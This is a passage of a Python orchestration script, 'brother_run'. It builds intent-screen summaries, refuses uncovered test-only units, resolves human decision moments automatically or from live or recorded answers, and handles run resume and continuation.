        return True
    base = parts[-1] if parts else ""
    return base.startswith("test_") or base.endswith("_test.py")


def _depends_on_text(row):
    """A row's depends_on as the screen prints it: ids joined, or "none"."""
    return ", ".join(str(d) for d in (row.get("depends_on") or [])) or "none"


def _uncovered_test_unit_line(rows):
    """THE COVERAGE DECLARATION (E40, run 5 critic 3, 2026-09-03): the
    refusal line, or "" when the plan is fine. The mutation at receipt
    (_stamp_dependency_mutations) can only revert what a unit DECLARED it
    builds on, so a test-only unit (every owned path a test file) that names
    no non-test unit in depends_on, in a plan that also holds a non-test
    unit, would read PASS on a check that proves nothing about the code it
    claims to cover: driven by the critic with stub models, exit 0 and 2
    PASS. Refused here, before any claim, in one line naming the unit and
    the reason, the same shape and exit as _dirty_tree_lines' refusal. A
    plan whose units are ALL test-only has nothing to cover and is not
    refused (its receipts say "proves its own change only"); a finished
    (DONE) test unit is left alone, its receipt already says what it
    proved."""
    test_only, others = [], set()
    for row in rows or []:
        owns = [str(p) for p in (row.get("owns") or row.get("writes") or [])]
        if owns and all(_is_test_path(p) for p in owns):
            test_only.append((row, owns))
        else:
            others.add(row.get("id"))
    if not test_only or not others:
        return ""
    for row, owns in test_only:
        if row.get("status") == "DONE":
            continue
        deps = [str(d) for d in (row.get("depends_on") or [])]
        if any(d in others for d in deps):
            continue
        return ("brother_run: refused at the intent screen: %s owns only "
                "test files (%s) and the test unit names no unit it covers; "
                "declare depends_on naming the unit it tests, nothing was "
                "claimed or run" % (row.get("id"), ", ".join(owns)))
    return ""


def _unit_check_lines(rows):
    """One line per unit for the intent screen: id, objective, its
    done_check VERBATIM (check-authorship-v1's Option A, the decision this
    run implements: "the intent screen ... lists each unit's id, objective
    and done_check verbatim") and its depends_on ("none" when empty; E40,
    the declaration the mutation at receipt reverts by, so a person can
    refuse a missing one before any work starts), plus a plain warning when
    _stamp_prechecks measured the check as already true of the untouched
    repository before any work happened. Reads only fields already stored
    on the row; nothing here is generated or reworded."""
    lines = []
    for row in rows:
        objective = str(row.get("objective") or row.get("title")
                       or row.get("name") or "")
        check = str(row.get("done_check") or "(no done_check recorded)")
        # P1 (persona integration): evidence family, oracle source and the
        # independence work_record.py derived from it, read straight off
        # the row (work_record.create() stamps all three; a row it never
        # touched simply has none, and that reads NO-DATA/unverified here,
        # never a guessed family).
        family = str(row.get("evidence_family") or NODATA)
        oracle = str(row.get("oracle_source") or NODATA)
        independence = str(row.get("independence") or "unverified")
        line = ("%s: %s. done_check: `%s`. depends on: %s. evidence family: "
                "%s, oracle: %s, independence: %s" % (
            row.get("id"), objective, check, _depends_on_text(row),
            family, oracle, independence))
        if row.get("check_passed_before") is True:
            line += (" WARNING: this check already passes before any work; "
                     "it cannot prove the work.")
        elif row.get("check_looks_broken"):
            # rule 4 (the zero-context critic, 2026-09-03), distinct from
            # the already-passes warning above: this check's pre-run
            # failure looked like it could never run at all (a syntax
            # error, a missing interpreter), not an ordinary failing
            # assertion a real fix could turn green.
            line += " WARNING: this check cannot run; it cannot prove the work."
        lines.append(line)
    return lines


def _risk_line(triggers):
    """P4: one line for the intent screen, aggregating
    receipt_door.risk_triggers' per-unit hits ([(name, unit_id, words), ...])
    by risk class name so a person reads the blast radius once rather than
    once per unit: 'Risk: migration (words: backfill), money (words:
    billing)'. "" when the units named none of the six classes, so a plain
    change's intent screen carries no risk line at all, the same "never cry
    wolf" rule risk_triggers itself documents (receipt_door.py line 58)."""
    if not triggers:
        return ""
    words_by_name = {}
    for name, _unit_id, words in triggers:
        seen = words_by_name.setdefault(name, [])
        for word in words.split(", "):
            if word and word not in seen:
                seen.append(word)
    return "Risk: " + ", ".join(
        "%s (words: %s)" % (name, ", ".join(words))
        for name, words in words_by_name.items())


def _human_decision_lines(record):
    """P4/P5: P5's own landed HUMAN_DECISION shape, read back here for the
    intent screen's summary. `record["human_decision"]` is a single dict,
    {"lens", "question", "answer"}, written once by _write_human_decision
    (above) after a live person answers the one profession-aware question;
    None (P5's own default on every fresh Work document) until then. []
    when absent, because an absent field is not a fact to invent a line
    around; a resumed run whose question was already answered shows the
    one line here, same as door.py's own lens assumption line beside it."""
    decision = record.get("human_decision")
    if not isinstance(decision, dict):
        return []
    question = str(decision.get("question") or "").strip()
    answer = str(decision.get("answer") or "").strip()
    lens = str(decision.get("lens") or "").strip()
    label = "Human decision (%s)" % lens if lens else "Human decision"
    if question:
        lines = ["%s: %s -> %s" % (label, question, answer)]
    else:
        lines = ["%s: %s" % (label, answer)]
    # COMPOSED (persona doc 5.2): a second inferred pack's question, when
    # this run asked one and a person answered it, gets its own line here
    # rather than being folded into the primary one. Absent on every
    # single-lens run, which is every run before composition landed.
    for extra in (decision.get("also") or []):
        if not isinstance(extra, dict):
            continue
        extra_lens = str(extra.get("lens") or "").strip()
        extra_label = ("Human decision (%s)" % extra_lens if extra_lens
                       else "Human decision")
        extra_question = str(extra.get("question") or "").strip()
        extra_answer = str(extra.get("answer") or "").strip()
        if extra_question:
            lines.append("%s: %s -> %s"
                         % (extra_label, extra_question, extra_answer))
        else:
            lines.append("%s: %s" % (extra_label, extra_answer))
    return lines


def _governor_wait_line(log, label, clock=None):
    """The ONE line said when a wait begins: what this run is waiting on and
    since when, in real clock time (never an invented duration; see THE
    GOVERNOR LINE above main()'s drain). `clock` is the wait's own start,
    overridable so a test can pin it. Returns that start, for
    _governor_wait_close to measure elapsed time against.

    Called ONCE per wait, outside the round loop: the drain below polls the
    same wait every round, and a line repeated every poll is exactly the
    noise this exists to prevent."""
    start = clock or datetime.datetime.now()
    log.say("brother_run: waiting on %s since %s; nothing else is running"
            % (label, start.strftime("%H:%M:%S")))
    return start


def _governor_wait_close(log, start, clock=None):
    """The ONE closing line, said once the wait above is over. Names real
    elapsed seconds, measured, never estimated."""
    elapsed = ((clock or datetime.datetime.now()) - start).total_seconds()
    log.say("brother_run: done waiting, %.1fs elapsed" % elapsed)


def _fact_spec(title, eyebrow, plain_summary, question, option_id,
              option_name, one_liner, marks, footer="", extra_options=None):
    """I3: one decide.py spec, reusing its screen model outright (never
    forked), carrying exactly the one option this run's own state already
    supports. `marks` is {criterion_key: (weight, mark, why)}, and every
    mark in it is a fact the CALLER already measured, never invented here:
    the same rule receipt_door.py's own MARK_TABLE holds ("A MARK IS A FACT
    LOOKED UP IN A TABLE, never a judgement"), applied to the two charter
    moments receipt_door does not cover. Mirrors
    receipt_door._criteria()/_option()'s own shape (one measured option,
    weights that already sum to one) so every human-moment screen this run
    poses is built by the identical rule and none of them can drift into a
    typed opinion.

    `extra_options`, when given, is a list of additional, already-built
    decide.py option dicts appended after the measured one (the intent
    screen's own "Refuse: nothing is claimed", check-authorship-v1's Option
    A). Every caller that predates this parameter passes nothing, so the
    spec still carries exactly one option and the existing "len(scored) ==
    1" contract is unchanged. An extra option that names no `scores` is
    unmarked on every criterion (decide.score()'s own rule) and so totals
    0.0, which is why a refuse option can sit on this same screen without
    ever outranking the measured one at the recorded-default resolver."""
    criteria = [{"key": key, "label": key.replace("_", " "), "weight": weight,
                "why": why} for key, (weight, _mark, why) in marks.items()]
    option = {"id": option_id, "name": option_name, "one_liner": one_liner,
             "scores": {key: mark for key, (_w, mark, _why) in marks.items()},
             "score_basis": {key: why for key, (_w, _m, why) in marks.items()}}
    return {"title": title, "eyebrow": eyebrow, "plain_summary": plain_summary,
           "question": question, "criteria": criteria,
           "options": [option] + list(extra_options or []),
           "footer": footer}


def _auto_resolver(moment, spec, scored, close):
    """I3's RECORDED DEFAULT (door-redesign-study's own phrase: "a passed-in
    resolver or a recorded default"), never a human: the option decide.py's
    own arithmetic already recommends, scored[0], the same "chosen
    automatically" pattern decide.py's own render() already documents for
    `auto_choose` ("You told this estate to make choices of this kind
    without asking, following the same pattern"). Used only where
    auto-proceeding is safe: intent and forcing-condition. Release and
    acceptance use _recorded_answer_resolver below instead, because
    loom.py's own rule for those two is "no default acceptor", and this
    function is exactly that, deliberately kept away from them. Never a
    silent skip: the choice is named, logged and reversible, which is what
    lets a non-interactive run (and every test that predates this seam)
    keep running to completion unattended."""
    top = scored[0]["option"] if scored else {}
    return {"choice": top.get("id"), "name": top.get("name", NODATA),
           "by": "brother_run (recorded default: the top-ranked option)",
           "auto": True}


def _recorded_answer_resolver(run_dir, screen):
    """Release and acceptance's own resolver: loom.py's already-shipped,
    already-ratified rule, READ BACK rather than reimplemented ("THE
    ANSWER, recorded in the person's own words and never generated ...
    There is no auto-accept, no default acceptor", loom.py's own module
    docstring). Returns a human's real recorded answer when loom.py has
    one on disk, and otherwise says plainly that none exists yet; unlike
    _auto_resolver above, it never invents one."""
    def _resolve(moment, spec, scored, close):
        answer = loom.read_answer(run_dir, screen)
        if answer:
            return {"choice": answer.get("choice"),
                   "name": answer.get("choice"), "by": answer.get("by"),
                   "auto": False}
        return {"choice": None, "name": NODATA,
               "by": "nobody yet; loom.py's own rule is no default "
                     "acceptor for this screen",
               "auto": False}
    return _resolve


def _interactive_resolver(stream, prompt_stream=None):
    """I3's OWED half of the recorded default above: a REAL live resolver
    for intent and forcing-condition, wired in by main() only when the
    caller asks (--interactive or BROTHER_INTERACTIVE=1; off by default, so
    every non-interactive caller and every test that predates this seam
    keeps using _auto_resolver exactly as before). Release and acceptance
    are untouched: they keep _recorded_answer_resolver and loom.py's own
    out-of-band, no-default-acceptor path.

    Unlike _auto_resolver, this never guesses: it prints the posed options
    to `prompt_stream` (sys.stderr by default) and then BLOCKS on
    `stream.readline()` (sys.stdin by default, or any object with that
    method, which is exactly what the driven test swaps in to stand in for
    a human without needing one) until a real line arrives. The prompt goes
    to `prompt_stream` rather than the chat stream on purpose: _human_moment
    already prints its own two-line echo/proof contract via log.say
    (stdout), and this must not add a third line to that surface just
    because a human happens to be attached; a live terminal still sees the
    prompt, on its other stream.

    An empty read (the stream closed, EOF, with no answer sent) is reported
    the same way _recorded_answer_resolver reports "nobody yet": named,
    never invented as a choice. A line naming neither an option's number nor
    its id re-prompts rather than guessing, because guessing is the exact
    danger intent and forcing-condition exist to stop."""
    out = prompt_stream or sys.stderr

    def _resolve(moment, spec, scored, close):
        options = [s["option"] for s in scored]
        while True:
            out.write("\n-- %s: your decision is needed --\n" % moment)
            for i, opt in enumerate(options, 1):
                out.write("  %d. %s (%s)\n"
                         % (i, opt.get("name", NODATA), opt.get("id", NODATA)))
            out.write("%s> " % moment)
            out.flush()
            line = stream.readline()
            if line == "":
                return {"choice": None, "name": NODATA,
                       "by": "nobody; the input stream closed before a "
                             "live answer arrived", "auto": False}
            line = line.strip()
            for i, opt in enumerate(options, 1):
                if line == str(i) or line == opt.get("id"):
                    return {"choice": opt.get("id"),
                           "name": opt.get("name", NODATA),
                           "by": "a human, live, at the %s screen" % moment,
                           "auto": False}
            out.write("brother_run: %r is not one of the options above; "
                      "type a number or an option id\n" % line)
            out.flush()
    return _resolve


def _moment_screen_path(log, moment, spec):
    """E91: where this moment's page lives, written here when it is not
    already on disk, so the log can name a file instead of carrying its
    markup. Returns the path, or a NO-DATA sentence saying why there is no
    file, never raising: a screen that cannot be written must not fail the
    run it describes (receipt_door.write_screen's own rule, reused rather
    than reimplemented, so the spec JSON lands beside the HTML exactly as it
    does for every other screen).

    WRITTEN ONCE, still. release and acceptance are already written by
    receipt_door.render_run_screens before this seam poses them, under these
    same names in this same directory, so an existing file is named rather
    than rewritten and that "written exactly once" rule stands."""
    if not log.path:
        return ("%s: this run has no run directory yet, so the %s screen's "
                "page could not be written; its plain summary above is the "
                "whole of it" % (NODATA, moment))
    out_path = os.path.join(os.path.dirname(log.path), "screens",
                            "%s-screen.html" % moment)
    if os.path.isfile(out_path):
        return out_path
    written, problem = receipt_door.write_screen(spec, out_path)
    return written or problem


def _screen_summary(spec, scored, screen_path):
    """E91: a decide.py screen in plain words, for the run log.

    THE MARKUP NEVER REACHES THE LOG OR THE TERMINAL. decide.render builds a
    web page (a <title>, a :root{ CSS block, about 150 lines of it), and
    logging that verbatim put lines 5 to 165 of a real run.log beyond
    reading in a terminal (roadmap row E91, measured on v1.0.1 by the t7
    overhead gauntlet). The page still exists, at `screen_path`, named on
    the last line here so a reader can open it.

    Every sentence is the spec's own, never re-worded: the title, the
    plain_summary paragraph and the question the caller already wrote, then
    one line per option with the score decide.rank() already computed and
    that option's own one_liner. A spec that carries none of those (an
    acceptance spec built by receipt_door, whose options carry different
    keys) still gets its title and its scored options, which is why nothing
    here is required to be present."""
    lines = [str(spec.get("title") or NODATA)]
    for key in ("plain_summary", "question"):
        text = str(spec.get(key) or "").strip()
        if text:
            lines.append(text)
    for entry in scored:
        option = entry.get("option") or {}
        one_liner = str(option.get("one_liner") or "").strip()
        lines.append("  %5.2f/10  %s%s"
                     % (entry.get("total") or 0.0,
                        option.get("name") or option.get("id") or NODATA,
                        (": " + one_liner) if one_liner else ""))
    lines.append("  the full screen: %s" % screen_path)
    return "\n".join(lines)


def _human_moment(log, moment, spec, resolver=None):
    """I3, the screen loom: pause at one of the charter's four human moments
    (MOMENTS, above). `spec` is a decide.py spec whose every option already
    carries a computed weight and a fact-based mark (built by _fact_spec or
    receipt_door.acceptance_spec/release_spec, never typed here); this
    reuses decide.rank() and decide.render() outright rather than forking
    either.

    THE MACHINERY goes to the run log only, the same rule RunLog already
    holds for loop_bridge's own output (RunLog's own docstring: "THE
    MACHINERY IS NOT DELETED, it is moved"), and since E91 it goes there in
    PLAIN WORDS: the log carries _screen_summary's paragraph and the path of
    the HTML page, while the page itself (decide.render's markup) is written
    to screens/<moment>-screen.html and read by opening it. THE CHAT STREAM
    gets exactly two lines: one ECHO (a screen was posed: how many options,
    which one the arithmetic recommends and at what score) and one PROOF
    (what was chosen, and how).

    `resolver(moment, spec, scored, close) -> {"choice", "name", "by", ...}`
    is how a choice is recorded, and THE RUN DOES NOT PROCEED PAST THIS
    CALL UNTIL resolver() RETURNS: that is the whole of "blocks" here, the
    same way any ordinary function call blocks its own caller until it
    returns. A resolver built to poll a human's out-of-band answer (the
    live shape _recorded_answer_resolver's caller would use) blocks for
    exactly as long as that takes; `resolver=None` uses _auto_resolver, the
    recorded default, which never blocks at all."""
    _criteria, _note, scored, close = decide.rank(spec)
    # THE MACHINERY, to the log, never the chat stream, and in words rather
    # than markup (E91): the page goes to a file, its path goes to the log.
    log.note("---- %s screen ----\n%s"
             % (moment, _screen_summary(
                 spec, scored, _moment_screen_path(log, moment, spec))))
    top = scored[0] if scored else None
    log.say("brother_run: %s: %d option(s) considered, %s recommended at "
            "%.2f/10%s"
            % (moment, len(scored),
               top["option"].get("name", NODATA) if top else NODATA,
               top["total"] if top else 0.0,
               " (the ranking does not separate the top two)" if close
               else ""))
    choice = (resolver or _auto_resolver)(moment, spec, scored, close)
    if choice.get("choice") is not None:
        log.say("brother_run: %s resolved: chose %r, recorded by %s"
                % (moment, choice.get("name") or choice.get("choice"),
                   choice.get("by") or NODATA))
    else:
        log.say("brother_run: %s: not yet recorded (%s)"
                % (moment, choice.get("by") or NODATA))
    return choice


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.split("\n")[0])
    ap.add_argument("outcome", nargs="?", default="",
                    help="what should be true when this is done; optional "
                         "with --resume, which carries its own outcome")
    ap.add_argument("--cwd", default=".", help="the repository to work in")
    ap.add_argument("--slots", type=int, default=3)
    ap.add_argument("--dry-run", action="store_true",
                    help="decompose and validate only; nothing is claimed, "
                         "written or run")
    ap.add_argument("--park-risky", action="store_true",
                    help="hold any piece of work whose own declared scope "
                         "names a risk class (encoding, auth, migration, "
                         "money, irreversibility, public API) until a person "
                         "answers the release screen this run leaves behind")
    ap.add_argument("--interactive", action="store_true",
                    help="pause at the intent and forcing-condition screens "
                         "for a live human choice, read from stdin, instead "
                         "of auto-resolving to the recorded default; also "
                         "on via BROTHER_INTERACTIVE=1. Release and "
                         "acceptance already pause for a human through "
                         "loom.py and are unaffected by this flag")
    ap.add_argument("--resume",
                    help="an existing run directory to finish after a crash; "
                         "the door is not re-asked and integrated units stay "
                         "done")
    ap.add_argument("--continue", dest="cont", nargs="?", const=CONTINUE_BARE,
                    default=None, metavar="N",
                    help="find an unfinished run for --cwd instead of naming "
                         "one; bare picks the only match (or lists them, "
                         "numbered, when there is more than one), --continue "
                         "N picks the Nth from that list")
    ap.add_argument("--heartbeat-seconds", type=float, default=None,
                    metavar="N",
                    help="how often, in seconds, a running piece of work "
                         "reports itself while nothing else is being "
                         "printed; 0 turns it off. Defaults to %d, or to "
                         "%s when that is set"
                         % (run_heartbeat.DEFAULT_INTERVAL_SECONDS,
                            run_heartbeat.INTERVAL_ENV_VAR))
    ap.add_argument("--quiet", action="store_true",
                    help="the old silence: no progress line while a piece of "
                         "work runs, and no durations of earlier runs on the "
                         "intent screen. The report at the end is unchanged")
    ap.add_argument("--runs-root",
                    help="where the run's Work document and claim store live "
                         "(under docs/plan/runs); defaults to this tool's own "
                         "repository, and to a brother-runs directory under "
                         "the temp root when that one cannot be written (a "
                         "read-only plugin install), never the target --cwd, "
                         "which integration requires to stay clean. WHAT CLEAN "
                         "MEANS HERE, exactly: every path git status reports "
                         "in the target counts, a tracked modification and "
                         "an untracked file alike, EXCEPT interpreter "
                         "bytecode (__pycache__/, .pyc, .pyo), which never "
                         "counts, so an untracked __pycache__/ does not stop "
                         "a run. Of the paths that do count, only one kind "
                         "refuses the run: a path inside this run's own "
                         "write set, and a path outside it, which is the "
                         "same refusal the merge would give later after "
                         "every worker had spent its attempts")
    args = ap.parse_args(list(sys.argv[1:] if argv is None else argv))

    cwd = os.path.abspath(args.cwd)
    runs_root = _resolve_runs_root(args.runs_root)
    log = RunLog()
    # I3, THE LIVE RESOLVER: built once, at most, and only when asked (the
    # flag or the env var, read fresh here rather than at import time so a
    # test can set either one right before calling main()). `None` when
    # nobody asked for it, which _human_moment's own "resolver or
    # _auto_resolver" already treats as "use the recorded default", exactly
    # the behavior every caller had before this seam existed.
    interactive = args.interactive or os.environ.get("BROTHER_INTERACTIVE") == "1"
    live_resolver = _interactive_resolver(sys.stdin) if interactive else None
    # T1's own clock: real elapsed wall time for the cost block, measured
    # from as close to process start as argument parsing allows, through to
    # the delivery report below. Never estimated.
    run_start = datetime.datetime.now()
    # E46: one number decided once, here, so the flag, the env var and
    # --quiet cannot disagree later. --quiet wins over both, because a
    # person who asked for silence asked for silence.
    heartbeat_seconds = (
        0.0 if args.quiet
        else (run_heartbeat.interval_from_env()
              if args.heartbeat_seconds is None else args.heartbeat_seconds))
    # harness-revision-v1: measured ONCE, here, before the door is asked, so
    # the creator stamp on a fresh record, the resumer stamp on a resumed one
    # and the cost block all name the same commit of this engine; a checkout
    # that moves mid-run (the first real run's audit found exactly that)
    # cannot give the record one sha and the report another.
    harness_revision = _harness_revision()
    resumed = False

    if not args.resume and args.cont is None and not args.outcome.strip():
        print("brother_run: an outcome, --resume or --continue is required",
              file=sys.stderr)
        return 1
    if args.cont is not None:
        if args.resume or args.outcome.strip():
            print("brother_run: --continue replaces an outcome and --resume, "
                  "it does not take either", file=sys.stderr)
            return 1
        # AUTOMATIC DISCOVERY: no run directory named by hand. Every
        # non-terminal run recorded against this --cwd is a candidate; see
        # find_unfinished_runs() for what "recorded against" and "non-
        # terminal" mean.
        matches = find_unfinished_runs(runs_root, cwd)
        if not matches:
            # E81: nothing to continue is an ABSENCE, not a success and not
            # a failure, so it is labelled NO-DATA in the estate's own
            # vocabulary rather than left as a bare sentence a reader has to
            # classify. The words the README promises a first-time reader,
            # "no unfinished run found", are kept verbatim inside it.
            print("brother_run: NO-DATA: no unfinished run found for %s; "
                  "there is nothing to continue. Ask for an outcome "
                  "instead:\n  %s"
                  % (cwd, _next_command(cwd, runs_root, ["<what should be "
                                                         "true when this is "
                                                         "done>"])))
            return 0
        if args.cont == CONTINUE_BARE:
            if len(matches) > 1:
                print("brother_run: %d unfinished runs found for %s:"
                      % (len(matches), cwd))
                for i, (_run_dir, outcome, _rec) in enumerate(matches, 1):
                    print("  %d. %s" % (i, outcome))
                print("brother_run: pick one with --continue N")
                return 1
            run_dir, outcome, record = matches[0]
        else:
            try:
                idx = int(args.cont)
            except ValueError:
                print("brother_run: --continue needs a number from the "
                      "list, got %r" % args.cont, file=sys.stderr)
                return 1
            if not 1 <= idx <= len(matches):
                print("brother_run: --continue %d is out of range; %d "
                      "unfinished run(s) found for %s"
                      % (idx, len(matches), cwd), file=sys.stderr)
                return 1
            run_dir, outcome, record = matches[idx - 1]
        # E73.2: --continue's own first words, before anything else this
        # branch prints, are the capsule's resume screen when this run left
        # one, or NO-DATA naming it when it did not.
        _print_resume_screen(run_dir, outcome)
        # ONE PLAIN SENTENCE NAMING THE OUTCOME, never the run directory: a
        # person who never knew run directories existed should not have to
        # learn what one is just to resume their own crashed work.
        log.to(run_dir)
        log.say("brother_run: resuming %r" % outcome)
        resumed = True
    elif args.resume:
        # CRASH RESUME: reuse a prior run's Work document and claim store
        # instead of decomposing again. The claim store's own reconcile
        # reports the dead owner's abandoned claims and the expired leases
        # free the units; integrated units stay DONE in the plan, so only
        # the unfinished remainder runs. The door is NOT re-asked: the plan
        # a crash interrupted is the plan the resume finishes.
        run_dir = os.path.abspath(args.resume)
        doc_path = _find_work_doc(run_dir)
        if not doc_path:
            print("brother_run: --resume needs a run directory holding "
                  "exactly one Work document; %s does not" % run_dir,
                  file=sys.stderr)
            return 1
        with open(doc_path, "r", encoding="utf-8") as fh:
            record = json.load(fh)
        record["path"] = doc_path
        log.to(run_dir)
        log.say("brother_run: resuming run %s" % run_dir)
        resumed = True
    else:
        # GAP 2 (2026-08-30 head-to-head recommendation): a plain outcome
        # against a --cwd that already holds an unfinished run must never
        # silently start a SECOND, competing Work on the same repository.
        # find_unfinished_runs() is the exact discovery --continue already
        # uses; only the routing is new here.
        unfinished = find_unfinished_runs(runs_root, cwd)
        resume_match = next(
            (m for m in unfinished if _outcomes_match(args.outcome, m[1])),
            None)
        if resume_match is not None:
            run_dir, prior_outcome, record = resume_match
            # SAME wording as --continue's own resume line: no run id or
            # directory in a user-facing line, ever.
            log.to(run_dir)
            log.say("brother_run: an unfinished run already covers %r; "
                    "resuming it instead of starting a new one"
                    % prior_outcome)
            resumed = True
        else:
            run_dir = run_dir_for(args.outcome, runs_root)
            if unfinished:
                # A genuinely different outcome: still start fresh, but
                # this is never silent. Name the unfinished run's
                # plain-language outcome, never its run id or directory.
                _ignored_dir, prior_outcome, _ignored_rec = unfinished[-1]
                print("brother_run: an unfinished run exists for this "
                      "repository (%r); starting a NEW, separate run for "
                      "%r rather than resuming it, since the outcomes "
                      "differ" % (prior_outcome, args.outcome))

        if resume_match is None:
            print("brother_run: working out what %r breaks down into"
                  % args.outcome)
            ok, record, door_text = run_door(args.outcome, run_dir,
                                             dry_run=args.dry_run, cwd=cwd)
            if os.path.isdir(run_dir):
                log.to(run_dir)
            # A REFUSAL IS THE USER'S BUSINESS, in the door's own words: it
            # says what it could not schedule and why, and paraphrasing that
            # into a plain line would drop the very detail a person needs to
            # re-ask. Success is the opposite: the door's internal accounting
            # goes to the log and the person gets one sentence.
            log.note(door_text.rstrip())
            if not ok or args.dry_run:
                print(door_text.rstrip())
            if not ok:
                print("brother_run: the door refused this outcome; nothing "
                      "was claimed or run", file=sys.stderr)
                # E81, THE NEXT COMMAND. Nothing was claimed, so there is no
                # run to continue and --continue would honestly find none;
                # the recovery route after a door refusal is to ask again,
                # and this is that ask, already quoted for the shell.
                print("brother_run: nothing to continue: the store is "
                      "untouched. Ask again, in the same words or clearer "
                      "ones:\n  %s"
                      % _next_command(cwd, runs_root, [args.outcome]),
                      file=sys.stderr)
                return 1
            if not args.dry_run:
                # RUN START, and only here: --resume and --continue both
                # reuse whatever a run already recorded rather than
                # re-stamping it, so a run is only ever associated with the
                # repository it was actually decomposed for.
                _write_run_target(run_dir, cwd)
                # THE CREATOR, stamped on disk once and never overwritten
                # (see _stamp_harness), so every later resume can still
                # name the engine whose plan and prechecks this record
                # carries.
                _stamp_harness(record["path"], "harness_revision",
                               harness_revision, overwrite=False)
                # E59, WORK CREATED, journalled HERE rather than in
                # work_record.create where the inventory named it. That
                # function writes into whatever --store it is given, and a
                # plain work store is not a run directory: a journal beside
                # the record there broke test_door.py's own contract that a
                # store holds exactly the record written to it (measured, 2
                # != 1, before this moved). This is the one place that knows
                # the store WAS this run's directory, and the run's own
                # journal is where the event belongs.
                journal.append(run_dir, "work.created", payload={
                    "work_id": record.get("work_id"),
                    "units": len(record.get("rows")
                                 or record.get("units") or [])})
    if resumed:
        # THE FENCE ON A FILE-SOURCED RECORD (security review 2026-09-04,
        # Critical). Every path above that reached here with `resumed` set
        # read its record off disk; a fresh run's record came from the door
        # a few lines up. Refusing the whole run rather than skipping the
        # unit is deliberate: a record holding one crafted check is not a
        # record to half-trust, and NO-DATA is never a pass.
        refused_checks = _guard_record_checks(record)
        for unit_id, reason in refused_checks:
            print("brother_run: %s's done_check was refused: %s"
                  % (unit_id, reason), file=sys.stderr)
        if refused_checks:
            print("brother_run: this record was loaded from disk, so its "
                  "checks are treated as repository-supplied content and "
                  "must each be one plain shell command. Nothing was "
                  "claimed or run; edit the refused done_check(s) in %s and "
                  "resume again." % record.get("path", "the Work document"),
                  file=sys.stderr)
            return 1
    if args.dry_run:
        print("brother_run: --dry-run, stopping before any work is claimed "
              "or run")
        return 0
    # E59, THE RUN'S JOURNAL OPENS HERE, and here is the earliest honest
    # place: run_dir is settled on all three paths above (fresh, --resume,
    # --continue), the directory exists (the door created it, or the run
    # being resumed did), and --dry-run has already returned, so a run that
    # never started never leaves a journal behind. The inventory named
    # run_dir_for() as the site; that function only COMPUTES a path string,
    # for a directory nothing has created yet and which --dry-run must not
    # create, so the event moved to where the run actually opens.
    #
    # The environment carries the run directory to the writers that hold no
    # run of their own (claim_store, integrate, worktree_lane, and
    # receipt_door's read-time projection), the same thread the two
    # merge-trailer variables below already use.
    os.environ[journal.RUN_DIR_ENV_VAR] = run_dir
    run_event = journal.append(run_dir, "run.opened", payload={
        "cwd": cwd, "resumed": resumed,
        "units": len(record.get("rows") or record.get("units") or [])})
    _write_capsule(run_dir)
    if resumed:
        # THE RESUMER, the second field beside the creator's, latest wins;
        # the receipts below name both (build_report).
        doc = _stamp_harness(record["path"], "harness_revision_resumed",
                             harness_revision, overwrite=True)
        created_by = str(doc.get("harness_revision") or NODATA)
        # E59: the one event whose parent is genuinely in hand rather than
        # taken from the run-level predecessor; run.opened was appended a few
        # lines above and its id is still held.
        journal.append(run_dir, "run.resumed", parent_ids=[run_event],
                       payload={"harness": harness_revision[:12],
                                "created_by": created_by[:12]})
        _write_capsule(run_dir)
        log.say("brother_run: resumed under harness %s; the record was "
                "created under harness %s"
                % (NODATA if harness_revision.startswith(NODATA)
                   else harness_revision[:12],
                   NODATA if created_by.startswith(NODATA)
                   else created_by[:12]))

    # E45, THE TWO VALUES THE MERGE TRAILERS NAME. integrate.py writes
    # Brother-Run and Brother-Harness onto every integration merge, and it is
    # reached IN PROCESS through loop_bridge, which has no parameter to carry
    # them. The environment is that thread, exported HERE: run_dir is settled
    # on all three paths by now (fresh, --resume, --continue), harness_revision
    # was measured once at the top, and nothing has merged yet. Without this a
    # real run's history reads NO-DATA twice, which is honest and useless.
    os.environ[integrate.RUN_ID_ENV_VAR] = os.path.basename(
        os.path.normpath(run_dir))
    os.environ[integrate.HARNESS_ENV_VAR] = harness_revision

    claims_path = os.path.join(run_dir, "claims.json")
    before = _head(cwd)
    log.to(run_dir)
    total_units = len(record.get("rows") or record.get("units") or [])
    # THE CLEAN-TREE PREREQUISITE, checked rather than stated, once the
    # record says which paths this run writes and before anything is
    # claimed: see _dirty_tree_lines for the two kinds of dirt and why only
    # one is refused.
    dirty_refusal, dirty_notice = _dirty_tree_lines(
        cwd, record.get("rows") or record.get("units") or [])
    if dirty_refusal:
        log.say(dirty_refusal)
        return 1
    if dirty_notice:
        log.say(dirty_notice)
    # THE COVERAGE DECLARATION (E40), checked the same way and at the same
    # point: a test-only unit beside a code unit must name a non-test unit
    # it covers in depends_on, or the mutation at receipt has nothing to
    # revert and its PASS would prove nothing about the code.
    uncovered = _uncovered_test_unit_line(
        record.get("rows") or record.get("units") or [])
    if uncovered:
        log.say(uncovered)
        return 1
    # I3, THE FIRST HUMAN MOMENT: intent. The outcome is settled now (fresh,
    # resumed by --continue, resumed by --resume, or resumed by the plain-
    # outcome match above); nothing has been claimed or run yet. `already`
    # is real, measured state from this run's own Work document, never a
    # typed number: a fresh run always reads 0 of N, a resumed one reads
    # whatever the document already carries.
    already = sum(1 for r in (record.get("rows") or record.get("units") or [])
                  if r.get("status") == "DONE")
    # CHECK DISCRIMINATION, run once here, BEFORE the intent screen and
    # before any unit is claimed: _stamp_prechecks re-reads and rewrites the
    # Work document itself (never the in-memory `record`, which carries a
    # "path" bookkeeping key that must not reach the file on disk), so the
    # rows this screen and every later receipt reads already carry
    # `check_passed_before` for every not-yet-DONE unit.
    precheck_rows = _stamp_prechecks(record["path"], cwd)
    # THE FIX (rule 4 follow-through, 2026-09-03): before this run gives up
    # on a unit whose check_looks_broken, ask the planner ONCE MORE for a
    # replacement, carrying the exact stderr the broken check produced.
    # Runs strictly before _refuse_broken_precheck_units, below, which still
    # refuses whatever comes back still broken, unchanged. Re-reads rows
    # fresh from disk so the intent screen below reflects any rewrite.
    precheck_rows = _rewrite_broken_checks(record["path"], cwd, log)
    unit_lines = _unit_check_lines(precheck_rows)
    # THE BOUND A PERSON SEES BEFORE WORK STARTS: the attempt cap and the
    # per-attempt time limit, on the intent screen together, the limit read
    # from the adapter that will really apply it (the same adapter run_loop
    # hands loop_bridge, since both resolve _source_tools_dir the same way)
    # rather than a number spelled in prose. `spawn` is kept for the cost
    # block below, whose usage gap reason reads the same loaded module.
